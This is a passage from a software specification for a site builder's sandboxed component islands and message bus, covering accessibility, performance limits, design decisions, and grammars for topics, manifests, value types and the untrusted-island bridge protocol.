reachable as a mutable property) — so one island cannot replace primitives or mutate retained
state out from under the bus's own reference monitor or later islands; and (b) every
build-emitted island asset SHALL be integrity-pinned, **by mechanism appropriate to how it
loads**: a `<script>` (trusted in-realm islands, and the iframe-escape-hatch bootstrap) SHALL
carry **Subresource Integrity** (`integrity="sha384-…"`); a **content Worker** script — which
loads via `new Worker(url)`, to which **SRI does not apply** — SHALL instead be pinned by the
REQ-5026 **content-hash-before-instantiation** check. Either way a tampered or substituted island
asset fails to load/start. This does not make a malicious trusted island harmless (it runs
first-party code by definition — [[SPEC-050-component-islands-and-messaging#Threat L]]), but it
removes the cheapest escalations (primitive replacement, asset substitution).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5019]], [[SPEC-050-component-islands-and-messaging#REQ-5026]]; [[SPEC-050-component-islands-and-messaging#Threat L]].

### REQ-5020: Island Accessibility (Both Render Modes)
The accessibility contract differs by render mode:
- **Default Worker mode** (painted subtree, REQ-5025/CON-5007): the subtree renders **inline
  in the parent document**, so it is in natural tab order and needs no frame `title`. Instead,
  CON-5007's allowlist MUST admit the `aria-*` and `role` attributes and the accessible-name
  affordances required by the interactive elements it allows (`<a>`, `<button>`), and the host
  renderer SHALL preserve document focus order for the painted nodes; an island that traps or
  steals focus is an `island-focus-trap` warning. (If `aria-*`/`role` were *not* allowlisted,
  the painted UI would be inaccessible — so this is a hard requirement on CON-5007, not advice.)
- **Iframe escape-hatch mode** (REQ-5015): the iframe SHALL carry a human-meaningful `title`
  (build-derived, author-overridable); tab order SHALL include the iframe in document order; a
  focus-trapping/auto-focusing island is an `island-focus-trap` warning.

In both modes, because the static (no-JS) component HTML is the accessible-by-default content
([[SPEC-050-component-islands-and-messaging#REQ-5002]]), any information an island surfaces
only after hydration SHALL have a no-JS equivalent in the parent HTML (WCAG 2.2 AA,
[[PROTO-001]] Principle 9).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5020]], [[SPEC-050-component-islands-and-messaging#REQ-5002]], [[SPEC-050-component-islands-and-messaging#REQ-5015]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#CON-5007]].

---

## 5. Non-Functional Requirements

### NFR-5001: Hydration Latency
Island hydration SHALL add ≤ 50 ms to time-to-interactive at the 95th percentile for a
page with ≤ 20 island instances of ≤ 5 distinct types, measured on the project reference
CI runner (`[Provisional]`, pin in IMPL-050). The no-island page (REQ-5012) carries zero
hydration cost.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5003]], [[SPEC-050-component-islands-and-messaging#OBS-5002]].

### NFR-5002: No Framework Runtime; Bounded Bus
The shell bus runtime SHALL be ≤ 4 KiB minified (`[Provisional]`) and SHALL pull in no
third-party framework. The bus SHALL enforce fail-closed bounds: ≤ 256 distinct topics,
≤ 1024 total subscribers (counting bridge-relayed content-island subscriptions, released
on teardown — REQ-5017), ≤ 64 KiB per retained value, a **per-inbound-message size + node
cap** (a `render` `tree` is bounded by CON-5007's depth/breadth/total-node/byte limits and a
cyclic clone is rejected, so a structured-clone tree-bomb cannot exhaust host memory or hang
the main-thread reconciler), an **inbound message-rate / `render`-coalescing bound** per island
(REQ-5026, symmetric with the REQ-5021 outbound debounce), and ≤ a per-page cap on
content-island **runtime (re)creations** (Worker spawns / iframe (re)creations) so a stalling
child cannot amplify allocation (REQ-5016). A breach SHALL be dropped with a console
diagnostic, never an unbounded allocation.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5004]]; [[SPEC-050-component-islands-and-messaging#Threat D]].

### NFR-5003: Deterministic Island Asset Set
For a given (vault, theme, options) tuple, the emitted island `<script>` set and order
SHALL be byte-identical across repeated builds (no map-iteration-order, no wall-clock),
reusing the [[SPEC-048]] NFR-4802 determinism guarantee.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5001]], [[SPEC-050-component-islands-and-messaging#OBS-5002]].

---

## 6. Architecture Decision Records

### ADR-5001: Inter-Island Messaging Is a Shell Bus, Not a Shared Store Module
Islands coordinate through a shell-provided bus (`store` + `bus`) rather than each island
importing a shared reactive-store compile unit — the **[[Astro Islands]] / [[Nano Stores]]
pattern**, the production reference for cross-island state. (+) Islands stay mutually
decoupled (publish/subscribe by topic name, no cross-import); no shared compile unit, so the
once-per-type emission model holds; one shell capability serves all islands ([[PROTO-001]]
Principle 15). (−) A retained store is marginally more than a bare emitter. **Prior art and
the load-bearing reason we diverge:** Astro — the framework that popularised islands — shares
state via Nano Stores, a `import`ed module every island reads. That is the *simpler, proven*
choice **and SPEC-050 would adopt it for a trusted-only design**. We cannot, because of the
**untrusted content-island tier**: a sandboxed, opaque-origin iframe (REQ-5015) **cannot
`import` the parent's store** — there is no shared module across the realm boundary. The
shell bus + capability bridge therefore earns its complexity *specifically* for the
content-island tier; for trusted in-realm islands alone, a Nano-Stores-style shared module
would suffice. Rejected: a shared imported store (cannot cross the sandbox; couples trusted
islands into a bundle; fights once-per-type emission); per-island `window` globals (no
contract, no audit, collide). Carried and extended from the deferred [[SPEC-048]] ADR-4808.

### ADR-5002: Replay-on-Subscribe Retained Store Is the Default Primitive
The default coordination primitive retains the last value and replays it on subscribe; the
ephemeral `bus` is secondary. (+) Correctness survives SPA re-hydration and late hydration
— the dominant islands failure mode (a `CustomEvent` fired before a subscriber mounts is
lost forever) is eliminated by construction; state like `theme` is exactly last-value-wins.
**This is not novel — it is exactly [[Nano Stores]]' semantics** (`atom.subscribe(fn)` fires
`fn` immediately with the current value, then on every change), which validates the design
against a shipping library used across Astro islands. (−) Slightly more than a bare event
emitter, and retained values must be bounded (NFR-5002). Rejected: bare `CustomEvent` only
(loses late subscribers — wrong for state, and what Nano Stores exists to avoid).

### ADR-5003: Content Islands Are Isolated With a Capability-Scoped Bridge *(render mechanism superseded by [[SPEC-050-component-islands-and-messaging#ADR-5010]])*
**Superseded in part (v0.9.0):** the *isolation + capability-bridge* decision stands, but the
default **isolation mechanism is now a Worker + controlled-element render** (ADR-5010), not an
iframe; the iframe is the opt-in escape hatch. The "*Web Worker instead of iframe*" alternative
this ADR originally **rejected** ("no DOM for the island's UI") is now the **chosen default** —
the Remote-DOM controlled-element model showed the no-DOM constraint is a feature (it closes
Threat M by construction), so that rejection is **retracted**. Read the body below as the
escape-hatch rationale.

Content-author islands are **permitted but isolated**: they run in a sandboxed iframe with
an opaque origin (no `allow-same-origin`), and reach the bus only through a capability-
scoped `postMessage` bridge ([[SPEC-050-component-islands-and-messaging#REQ-5010]],
[[SPEC-050-component-islands-and-messaging#REQ-5015]],
[[SPEC-050-component-islands-and-messaging#REQ-5016]]). (+) Closes the bus-escalation
threat with a **real enforcement boundary** — realm isolation means the island has no
reference to `window.zetl`, and the parent-side bridge is the sole reference monitor,
enforcing per-`(topic, direction)` grants and payload types on every message; a markdown
author can therefore never forge or overwrite a trusted topic. (+) Content authors regain
interactivity (the capability they're missing in a forbid-only model). (−) An iframe per
content island carries layout/perf cost and a `postMessage` hop; trusted theme islands
avoid it by running in-realm (REQ-5010). **Supersedes the v0.1.0 strawman decision** to
forbid content islands. Rejected, and why: *forbid entirely* (the strawman — needlessly
removes a capability now that a sound sandbox exists); *same-realm with topic-namespacing*
(string namespaces don't isolate same-realm JS — unsound, the original [[SPEC-048]] v0.1.1
error); *Web Worker instead of iframe* (no DOM for the island's UI). This is the central
security decision of the spec — it rests on three legs: **realm isolation** (REQ-5015),
**capability scoping** (REQ-5016), and **payload typing** (REQ-5013).

### ADR-5004: Per-Type-Once ES Module Emission, No Framework Runtime
An island is a plain ES module emitted once per component type per page, hydrating
`data-z` nodes — not a framework component. (+) Reuses the [[SPEC-048]] dedup/emission
model and the static-first output; the no-island page stays JS-free. (−) Authors write
vanilla DOM code (mitigated: the surface is small interactive widgets). Rejected: bundling
a reactive framework (breaks JS-free output, bloats the no-island page, new supply-chain
surface).

### ADR-5005: Persisted Topics Carry a Declared Default + Inline Pre-Paint Set
A persisted topic MUST declare a default, and the shell emits a tiny **inline, render-
blocking** pre-paint script that applies the stored (recognised) value before first paint
(REQ-5006). (+) Eliminates flash-of-wrong-theme without waiting for module hydration. (−)
A small inline script is the one render-blocking exception to the otherwise-deferred island
model — justified because FOUC is a first-paint problem hydration cannot solve. The stored
value is treated as untrusted input and recognised before application
([[SPEC-050-component-islands-and-messaging#Threat C]]).

### ADR-5006: SPEC-050 Number Allocation
Allocated **SPEC-050** per [[SPEC-048]] ADR-4807's successor plan (SPEC-049 content
directives, SPEC-050 islands+messaging, SPEC-051 scoped CSS). The manifest keys
`publishes`/`subscribes` — reserved-and-rejected in SPEC-048 CON-4801 — are activated here.

### ADR-5007: Topics Are Typed; Payloads Recognised at the Bus Boundary
Every topic declares a value type, and the bus recognises every payload against it before
storing, replaying, or delivering ([[SPEC-050-component-islands-and-messaging#REQ-5013]],
[[SPEC-050-component-islands-and-messaging#CON-5005]]). (+) Extends the LangSec discipline
to runtime messages — a subscriber never receives an unrecognised value, and the
capability bridge has a concrete schema to validate untrusted iframe messages against
(typing is what makes the bridge's "(b) payload conforms" check meaningful rather than
nominal). (+) Build-time detection of incompatible co-publishers
(`island-topic-type-conflict`). (−) Authors annotate a type per topic; the type language
is deliberately small (CON-5005) to stay validatable ([[PROTO-001]] LangSec principle 6 —
minimise grammatical power). Rejected: opaque/structurally-cloned values (the v0.1.0
`[Blocked: Q3]` position) — they leave the bridge unable to distinguish a valid `theme`
value from arbitrary attacker data, undermining REQ-5016.

### ADR-5008: The Bridge Is a Capability (Port + Reference Monitor), Not an API Surface
The sandboxed island's authority to reach the bus *is* a transferred `MessageChannel`
port; the parent holds the grant table and validates every message (capability security —
possession is authority, the holder cannot widen its grant). (+) No ambient authority: an
island can do exactly what its manifest declared and nothing more, checked at the boundary
on every message; trusted-topic grants are subscribe-only and explicit, so a content
island can *read* `theme` (to style itself) but never *write* it. (+) The reference monitor
is small and centralised (one bridge), not scattered per-island. (−) A `postMessage` hop
per message (acceptable for UI-coordination cadence; NFR-5002 bounds apply). **Identity is
established in two stages, then held by the port** (REQ-5016, CON-5006): a sandboxed frame's
origin is the indistinguishable string `"null"` and channel-port messages have
`source === null`, so origin/source are useless on the port. So the parent (1) routes the
child's window-level `zetl:ready` by **`event.source` `WindowProxy` identity** — the one
direction where source *does* discriminate (the parent holds the iframe's `contentWindow`) —
and only then transfers that island's `port2`; (2) thereafter identifies the island by
**port-object identity** (`WeakMap<port1, Island>`). The child-ready-first bootstrap is
required (a blind first-message transfer would race the child's listener install); it is the
spec's single identity ceremony. Rejected: relying on `MessageEvent.origin`/`source`
(non-discriminating for opaque-origin frames — the trap an earlier draft fell into); exposing
a filtered `window.zetl` proxy into the iframe (requires `allow-same-origin`, which collapses
the realm isolation REQ-5015 depends on); a per-topic global callback registry (ambient,
unauditable, collision-prone).

### ADR-5009: Hydration Strategies Mirror Astro's `client:*` Directives
Per-island hydration timing (`load`/`idle`/`visible`/`media`,
[[SPEC-050-component-islands-and-messaging#REQ-5024]]) is modelled directly on [[Astro
Islands]]' `client:load`/`client:idle`/`client:visible`/`client:media` directives. (+) A
proven, widely-understood vocabulary; `visible` (IntersectionObserver) is a large
below-the-fold win and, for content islands, defers the *entire* iframe + capability
bootstrap until scrolled to — turning off-screen content islands into zero runtime cost.
(+) Composes with progressive enhancement (REQ-5002): strategy is a timing optimisation over
already-usable static HTML, never a gate on content. (−) Four triggers to implement and test
(all are small platform-API wrappers — `requestIdleCallback`, `IntersectionObserver`,
`matchMedia`). Rejected: a single eager `load`-only model (wastes work and, for content
islands, pays the iframe cost for never-seen widgets); `client:only` (skip server render) —
out of scope, since SPEC-050 mandates a static no-JS rendering (REQ-5002). Astro's broader
prior art (Nano Stores for state, partial hydration) also grounds ADR-5001/5002.

### ADR-5010: Content Islands Default to a Worker + Controlled-Element Model (Remote DOM), iframe as Escape Hatch
Drawing on the prior art the `ar-crawl` research surfaced ([[Shopify Remote DOM]],
[[amp-script]]/[[worker-dom]], [[SES]]/[[CapTP]]), the **default** content-island surface is a
**Web Worker that emits a host-rendered controlled element tree** (REQ-5025), not a sandboxed
iframe rendering its own DOM. The sandboxed iframe (REQ-5015) is retained only as an **opt-in
escape hatch** for islands needing arbitrary DOM. (+) **Closes Threat M by construction** —
untrusted code never emits HTML/script, only a declarative tree the host paints with safe
primitives (the single strongest reason; Remote DOM ships exactly this for untrusted merchant
extensions). (+) **Dissolves the hardest bridge problems** — a `Worker` has no `"null"`
origin, no `event.source` ambiguity, no port-transfer race, and no `contentWindow` routing
map; the parent holds the `Worker` reference and `postMessage`s it directly, so the four
review passes' iframe-identity machinery (REQ-5016 bootstrap/`WindowProxy`) becomes
escape-hatch-only. (+) Stronger DOM isolation (a Worker has no DOM/`window`; **but it keeps
ambient network + same-origin storage**, which must be confined — REQ-5026 — not assumed absent;
this was v0.11.0's error) and
**inline rendering with page CSS** (no iframe layout/sizing pain — Q6). (−) The default mode
cannot run arbitrary DOM or DOM-manipulating third-party libraries — those need the iframe
escape hatch; and the host must ship a small renderer + element/attribute allowlist. Rejected:
iframe-only (the model SPEC-050 carried through v0.8.0 — heavier, weaker against Threat M, and
the source of the bridge complexity); a same-realm Worker proxy of `window.zetl` (defeats the
isolation point). This is the most consequential design change the prior-art study produced;
it **supersedes the iframe-default** of ADR-5003. **Consolidation debt:** the iframe-specific
clauses (REQ-5015/5016, CON-5006, Threats I/J/K) are now *escape-hatch* scoped; a follow-up
revision SHOULD make every content-island clause explicitly mode-aware (tracked in §13).

---

## 7. Contracts (LangSec)

> Every contract accepts author- or storage-supplied input and declares a grammar; full
> recognition precedes any action ([[PROTO-001]] §LangSec).

### CON-5001: Topic Name Grammar
**Interface:** a topic name at a manifest declaration or a runtime `store`/`bus` call. The
trust partition is **encoded in the grammar** (two disjoint productions), not enforced by a
post-parse semantic check — so a recogniser that implements only the grammar already
rejects a content island's attempt to name a trusted topic.
**Grammar (the two productions are genuinely disjoint — `trusted-first` is a *regular set
difference* that structurally excludes the literal `content`, so the partition is in the
recogniser's DFA, not a post-parse check):**
```
topic          = content-topic | trusted-topic ;
content-topic  = "content" ":" segment { ":" segment } ;   (* content-author islands *)
trusted-topic  = trusted-first { ":" segment } ;           (* trusted islands *)
trusted-first  = segment \ "content" ;     (* any segment EXCEPT the exact string "content"; *)
                                           (* set difference of regular languages — still regular *)
segment        = lower { alnum | "-" } alnum ;             (* ≥ 2 chars; lower-first; no trailing "-" *)
alnum          = lower | digit ;
lower          = "a".."z" ; digit = "0".."9" ;
```
`content:filter` matches only `content-topic` (its first token after `content:` cannot
re-enter `trusted-first`); a trusted topic whose first segment is the bare word `content`
is **not in the trusted-topic language at all** (excluded by `\ "content"`), and bare
`content` with no `:` matches neither production — all rejected structurally. Regular
languages are closed under finite set difference, so `trusted-first` is implementable as a
DFA; the disjointness is therefore a property of the grammar, not an out-of-band rule.
**Pre-conditions:** input is **ASCII** (the grammar is ASCII-only; a non-ASCII byte is
rejected before recognition, so byte- and character-length coincide and no homoglyph can
enter); ≤ 128 characters total; ≤ 8 segments; matches exactly one production.
**One shared, anchored recogniser (build == runtime).** Topic-name recognition — like value
typing (CON-5005) — SHALL be **one recogniser per language**: the build-time (manifest) and
runtime (call-site) checks SHALL be generated from, or provably equivalent to, the same
anchored DFA/regex (whole-string `^…$` match, no `.`/dot-all surprises). A build/runtime
divergence on a rejected input (e.g. an embedded newline or control byte) is a
parser-differential defect, not acceptable for this trust-partition key.
**Post-conditions:** a validated topic key tagged with its trust domain (content vs
trusted), consumed by the grant table (REQ-5016) and wiring check (REQ-5008). **Error
model:** out-of-grammar or wrong-domain-for-author → `island-topic-malformed` (error) at
build for declarations, dropped with a console diagnostic at runtime for call sites.
**Implements:** [[SPEC-050-component-islands-and-messaging#REQ-5011]].
**Verified by:** [[SPEC-050-component-islands-and-messaging#TEST-5011]].

### CON-5002: Island Manifest Fields (topics, types, persistence, grants)
**Interface:** the island-related keys added to the [[SPEC-048]] CON-4801 manifest, plus
the theme-level capability grants for content islands.
**Grammar (valid TOML — topic keys are *quoted* keys since `:`/`-` are not bare-key chars;
`default` is a native TOML value of the topic's declared type, not a string):**
```
publishes   = "publishes"  "=" "[" { quoted-topic } "]" ;   (* quoted-topic = '"' topic '"' *)
subscribes  = "subscribes" "=" "[" { quoted-topic } "]" ;
render      = "render" "=" '"' render-mode '"' ;  (* content islands; default "worker" — REQ-5010/5025 *)
render-mode = "worker" | "iframe" ;         (* "worker" = controlled-element default; "iframe" = full-DOM escape hatch *)
sandbox     = "sandbox" "=" bool ;          (* ONLY meaningful for render="iframe" (MUST be true); forbidden/ignored for render="worker" *)
paints      = "paints" "=" bool ;           (* worker mode: grants the `render` capability (CON-5006/CON-5007); default false = headless *)
hydrate     = "hydrate" "=" '"' strategy '"' ;   (* default "load" — REQ-5024 *)
strategy    = "load" | "idle" | "visible" | "visible(" rootmargin ")" | "media(" css-query ")" ;
requests    = "[island.requests]" ,             (* author REQUESTS — inert until operator approves; REQ-5028 *)
              [ "connect-src" "=" "[" { '"' host '"' } "]" ]   (* hosts the island would like to reach *)
              [ "bundles" "=" "[" { '"' lib '"' } "]" ]        (* libraries vendored into the pinned bytes *)
              [ "reason" "=" '"' text '"' ] ;                  (* rationale shown to the operator *)
(* NOTE: worker egress is enforced ONLY by the TRUSTED operator's host-document CSP (REQ-5026/5027).
   [island.requests] is a fail-closed *request* an author writes; it confers nothing until the
   operator approves it in [security.csp]. An untrusted author cannot widen their own egress. *)
topics      = "[island.topics]" , { topic-decl } ;
topic-decl  = quoted-topic "=" inline-table ;               (* e.g. "search:open" = { type = "bool" } *)
inline-table= "{" "type" "=" '"' type-expr '"'             (* type-expr text per CON-5005, quoted *)
                 [ "," "persisted" "=" bool ]
                 [ "," "default" "=" toml-value ] "}" ;     (* toml-value MUST match the declared type: *)
              (* string/enum -> TOML string; bool -> TOML bool; int -> TOML integer;        *)
              (* number -> TOML float; record -> TOML inline table of scalar values         *)
(* theme.toml only — authorises a content island to SUBSCRIBE a trusted topic: *)
grant       = "[[theme.island-grants]]" , 'component = "' name '"' ,
                                          'topic = "' topic '"' , 'direction = "subscribe"' ;
```
**Pre-conditions:** every topic matches CON-5001 (quoted in TOML); each published/subscribed
topic has an `[island.topics]` declaration; a `persisted = true` topic declares a `default`
whose **TOML value conforms to its declared type** (CON-5005); a content-author component's
`publishes` are all `content:`-prefixed (REQ-5011); a content island's `render` is `"worker"`
(default) or `"iframe"`; **`sandbox` is meaningful ONLY for `render = "iframe"`** (where it
MUST be `true`) and is forbidden/ignored for `render = "worker"` (a Worker is isolated by
construction — there is no iframe to sandbox); `paints` is meaningful only for
`render = "worker"` (default `false` = headless); **worker egress is NOT a manifest field** — it
is the trusted theme/operator's host-document CSP (REQ-5026), so an untrusted author cannot widen
their own network access; a content island's `subscribes` of a trusted topic requires a matching
`[[theme.island-grants]]` entry; a `hydrate` value matches `strategy` (REQ-5024), defaulting to
`"load"`.
**Grant-gated trusted subscribe (normative — as implemented).** A content island MAY
SUBSCRIBE to a **trusted (non-`content:`) topic ONLY when a matching `[[theme.island-grants]]`
entry grants it.** Listing the trusted topic in the component's own `subscribes` manifest is
**NOT sufficient** — the grant is the trusted theme author's, not the (untrusted) component
author's. An ungranted trusted subscribe is a **fatal build error**
(`island-capability-ungranted`), never a silent drop or a runtime-only check. Content
(`content:`-prefixed) topics are the island's own domain and need no grant.
**Post-conditions:** typed island metadata feeding wiring verification (REQ-5008), the
audit graph (REQ-5009, incl. render mode + `paints` grant + the page's egress CSP), the bridge
grant table (REQ-5016), payload typing (REQ-5013), and the hydration trigger (REQ-5024).
**Error model:** malformed topic → `island-topic-malformed`; persisted-without-default or
default-not-of-type → `island-persisted-no-default`; a content island with `render = "iframe"`
publishing a non-`content:` topic or lacking `sandbox = true` → `island-content-unsandboxed`
(this error is **iframe-mode-scoped**; `sandbox` on a `worker` island → `island-render-invalid`);
content island subscribing a trusted topic with no grant → `island-capability-ungranted`; a
content island **publishing** a topic whose declared type is free `string` or a record with a
`string` field → `island-content-value-type` ([[SPEC-050-component-islands-and-messaging#REQ-5022]]);
an unrecognised `render` mode or a mode/field mismatch → `island-render-invalid`; an unrecognised
`hydrate` strategy → `island-hydrate-invalid` — all build errors.
**Implements:** [[SPEC-050-component-islands-and-messaging#REQ-5006]], [[SPEC-050-component-islands-and-messaging#REQ-5008]], [[SPEC-050-component-islands-and-messaging#REQ-5013]], [[SPEC-050-component-islands-and-messaging#REQ-5016]], [[SPEC-050-component-islands-and-messaging#REQ-5022]], [[SPEC-050-component-islands-and-messaging#REQ-5024]].
**Verified by:** [[SPEC-050-component-islands-and-messaging#TEST-5006]], [[SPEC-050-component-islands-and-messaging#TEST-5008]], [[SPEC-050-component-islands-and-messaging#TEST-5016]], [[SPEC-050-component-islands-and-messaging#TEST-5024]].

### CON-5003: Bus Runtime API (`window.zetl`)
**Interface:** the client-side bus surface.
```
window.zetl.store(topic) -> {
    get():        current value (or the declared/initial default),
    set(value):   replace value, notify subscribers (coalesce if unchanged),
    subscribe(fn): fn(value) called immediately with current value, then on each change;
                   returns an unsubscribe() function
}
window.zetl.bus = {
    emit(topic, detail): fire-and-forget, NO retain, NO replay,
    on(topic, fn):       returns an off() function
}
```
**Pre-conditions:** `topic` matches CON-5001; `value`/`detail` conform to the topic's
declared type ([[SPEC-050-component-islands-and-messaging#CON-5005]], REQ-5013) and are
structured-clone-safe; bounds within NFR-5002.
**Post-conditions:** retained-store invariants (REQ-5005); bus is non-retaining; both
survive navigation (REQ-5007); every delivered value has been type-recognised.
**Error model:** malformed topic, type mismatch (`island-payload-type`), or bound breach →
dropped with a console diagnostic, never a throw that breaks unrelated islands.
**Implements:** [[SPEC-050-component-islands-and-messaging#REQ-5004]], [[SPEC-050-component-islands-and-messaging#REQ-5005]], [[SPEC-050-component-islands-and-messaging#REQ-5007]].
**Verified by:** [[SPEC-050-component-islands-and-messaging#TEST-5004]], [[SPEC-050-component-islands-and-messaging#TEST-5005]].

### CON-5004: Persisted-Topic Storage Encoding
**Interface:** the `localStorage` key/value for a persisted topic and the `storage`-event
read path. **This is an untrusted-input boundary** — another tab, an extension, or a prior
version may have written the value.
**Grammar:** key = `zetl:topic:<topic>`; value = a JSON document conforming to the topic's
declared **type** ([[SPEC-050-component-islands-and-messaging#CON-5005]]); a recogniser
rejects non-conforming or oversized values.
**Pre-conditions:** the read uses **`event.newValue`** from the `storage` event directly
(never a follow-up `localStorage.getItem`, which would re-introduce a TOCTOU race with a
concurrent cross-tab write); the value is ≤ the per-value cap (NFR-5002) and conforms to the
topic's declared type. A `newValue` of `null` (key deleted) or the empty string is treated
as "absent" and resolves to the declared default **without** a JSON parse.
**Post-conditions:** a recognised value applied to the store; on any failure (parse, type,
size, or `null`/empty) the declared **default** is applied and the bad entry is overwritten.
**Error model:** parse/type/size/null failure → discard + default (never apply raw —
[[SPEC-050-component-islands-and-messaging#Threat C]]).
**Implements:** [[SPEC-050-component-islands-and-messaging#REQ-5006]], [[SPEC-050-component-islands-and-messaging#REQ-5013]].
**Verified by:** [[SPEC-050-component-islands-and-messaging#TEST-5006]].

### CON-5005: Topic Value Type
**Interface:** the declared value type of a topic (`[island.topics].<topic>.type`), used by
the bus, the persisted-read path, and the capability bridge to recognise every payload.
**Grammar (deliberately small — LangSec principle 6):**
```
type-expr   = "string" | "bool" | "int" | "number"
            | "enum(" literal { "," literal } ")"     (* closed value set, ≥1 literal, no dups *)
            | "{" field { "," field } "}" ;           (* strict flat record, ≥1 field, unique idents *)
field       = ident ":" scalar-type ;
scalar-type = "string" | "bool" | "int" | "number" | "enum(" literal { "," literal } ")" ;
literal     = json-string ;                            (* JSON string token, double-quoted, *)
                                                       (* no control chars; enum match is case-sensitive *)
```
**One shared recogniser, fed a per-site-normalised value (the B3 correction).** The four
enforcement sites receive the candidate in different *shapes*, so each first normalises to a
plain parsed value, then the **single** type recogniser below runs — there is one recogniser
per type (one parser per language, [[PROTO-001]] §LangSec), not three:
- **persisted read** (CON-5004): input is JSON **text** → `JSON.parse` into a value (reject
  on parse error), then recognise.
- **bridge** (CON-5006): input is a **structured-clone** object graph → prototype-check +
  null-prototype re-build (own-enumerable data only) → recognise.
- **in-realm `store.set`/`bus.emit`**: input is **already a live JS value** from *trusted*
  code → recognise directly. (This is a robustness/wiring check, not a trust boundary — the
  caller is first-party per [[SPEC-050-component-islands-and-messaging#Threat L]]; see
  [[SPEC-050-component-islands-and-messaging#REQ-5013]].)
**Value-recognition semantics (applied to the normalised value):**
- `string` — a JS string with no control characters.
- `bool` — `true`/`false` only.
- `int` — a finite number with no fractional part, in `[-(2^53-1), 2^53-1]`; `NaN`,
  `Infinity`, `-Infinity` rejected; `-0` normalised to `0`.
- `number` — a **finite** number; `NaN`/`Infinity`/`-Infinity` rejected (note
  `JSON.parse("1e400") → Infinity`, so this MUST be checked, not assumed).
- `enum(...)` — equals one listed `literal` (case-sensitive); the declared set MUST be
  non-empty and duplicate-free (else `island-topic-type-invalid`).
- record — an object whose own-key set **equals** the declared field set (strict: missing OR
  extra keys are a violation), each value conforming to its `scalar-type`; the declared field
  list MUST be non-empty with unique idents; the recogniser rebuilds onto a null-prototype
  object and rejects `__proto__`/`constructor`/`prototype` keys
  ([[SPEC-050-component-islands-and-messaging#Threat H]]).
**Pre-conditions:** the type-expr parses (non-empty enum/record, unique idents/literals).
(`literal` here is only the **enum-member** form *inside* a type-expr — always a quoted
string; a topic's **`default`** is a separate native TOML value of the declared type per
CON-5002, not a `literal`.) A declared `default` MUST itself conform to the type.
**Post-conditions:** a recogniser that accepts exactly the conforming values; **no nested/
recursive shapes** in v1 (records are flat — keeps validation decidable). The recogniser
operates on the normalised value; it never trusts a raw structured-clone object before the
prototype check (which would admit prototype pollution).
**Error model:** unparseable/empty/duplicate type-expr → `island-topic-type-invalid`; a
normalised value outside the type → `island-payload-type` (drop + default/diagnostic, never
deliver).
**Implements:** [[SPEC-050-component-islands-and-messaging#REQ-5013]].
**Verified by:** [[SPEC-050-component-islands-and-messaging#TEST-5013]].

### CON-5006: Capability-Bridge Message Protocol
**Interface:** the wire protocol between an untrusted content island and the parent-side
bridge ([[SPEC-050-component-islands-and-messaging#REQ-5016]]). **The island is untrusted** —
every inbound message is recognised before any bus action. The **message shapes and the value
recognition below are identical for both render modes**; only the *transport and island
handle* differ.

**Island handle — by transport:**
- **Worker (default — [[SPEC-050-component-islands-and-messaging#REQ-5025]]):** the parent
  holds the `Worker` object it created; the handle is that object (`Map<Worker, Grant>`).
  Messages from a `Worker` are unambiguously that worker's — **no `origin`, no `source`, no
  bootstrap, no port transfer**. The worker installs `self.onmessage` synchronously at script
  top, so the first message is never lost. This is the simple default.
- **Iframe (escape hatch — [[SPEC-050-component-islands-and-messaging#REQ-5015]]):** an
  opaque-origin iframe has `MessageEvent.origin === "null"` for *every* such frame and
  `MessageChannel` messages carry `source === null`, so origin/source are non-discriminating
  and MUST NOT be used for identity. Identity is the **child-ready-first bootstrap**: the
  child posts `zetl:ready` over `window`; the parent routes by `event.source` `WindowProxy`
  identity (`Map<WindowProxy, Island>`, hit → transfer that island's `port2`, miss → no-op,
  payload ignored for routing); thereafter the handle is **`port1` object identity**
  (`WeakMap<port1, Island>`). This is the one handshake, and it exists only because the iframe
  realm denies the simple `Worker` identity.

**Inbound `value`/`tree` recognition is by input *shape*, not "JSON text":** messages cross
the channel (`Worker` or port) by **structured clone**, so the parent receives a **live object
graph**, not a JSON string. The bridge SHALL therefore (1) reject any `value` whose prototype is not
`Object.prototype`/`Array.prototype`/a primitive (no exotic or poisoned prototype), (2)
**re-build** `value` onto a `null`-prototype structure copying only own-enumerable data
properties (so `__proto__`/`constructor`/getters cannot ride along), then (3) recognise that
normalised value against the topic's declared type ([[SPEC-050-component-islands-and-messaging#CON-5005]]).
This is the **same shared recogniser** the persisted-read path runs, applied after a
shape-normalisation step appropriate to clone input — there is one type recogniser, fed a
normalised value (CON-5005), not three divergent parsers
([[SPEC-050-component-islands-and-messaging#REQ-5013]]).

**Message *object shapes* (these cross by `postMessage`/structured clone — they are live
object graphs, NOT JSON text; do not write a JSON-string parser for them). "Channel" = the
`Worker` (default) or the transferred `port1` (iframe escape hatch):**
```
(* iframe escape hatch only — child → parent over window, before the port exists: *)
zetl:ready : { op: "ready" }                         (* routed by event.source identity only *)
(* both transports — child → parent, on the channel: *)
publish    : { op: "publish",  topic, value }
emit       : { op: "emit",     topic, value }
subscribe  : { op: "subscribe",  topic }
unsubscribe: { op: "unsubscribe", topic }
render     : { op: "render",   tree }                (* default mode only; requires a render grant
                                                        (CON-5002) — a headless island cannot paint *)
(* parent → child, on the channel: *)
ack        : { op: "ack",    topic, cseq? }           (* cseq = echo of the island's own outbound counter, if sent *)
denied     : { op: "denied", topic?, node?, reason }  (* node = locator of a dropped render node *)
update     : { op: "update", topic, value, seq }      (* seq = host total-order sequence of this change (REQ-5030) *)
reason     ∈ { "ungranted", "type", "cap-exceeded", "malformed", "render" }
seq        = strictly-monotonic per-session integer assigned by the host in total order (REQ-5030);
             also delivered on the replay value at subscribe; gaps mean coalesced (REQ-5021/5026) drops
value      = a structured-clone datum: prototype-checked + null-proto-normalised, then
             recognised against the topic's declared type (CON-5005) — see above
tree       = a RECURSIVE controlled element tree recognised + painted ONLY per CON-5007 (its own
             bounded, cycle-aware recogniser + element/attr/URL allowlist — NOT the flat `value`
             recogniser). A bad node is dropped with denied:render + its `node` locator; the rest
             of the tree still paints. A missing host allowlist → whole message dropped (CON-5007)
op, topic  = own string properties; the parent reads ONLY own-enumerable data (a
             poisoned-prototype envelope is rejected like a poisoned value)
```
**Pre-conditions (enforced by the parent on every inbound msg):** the message arrives from a
**known island handle** (the `Worker`, default; or a `port1` in the `WeakMap`, escape hatch);
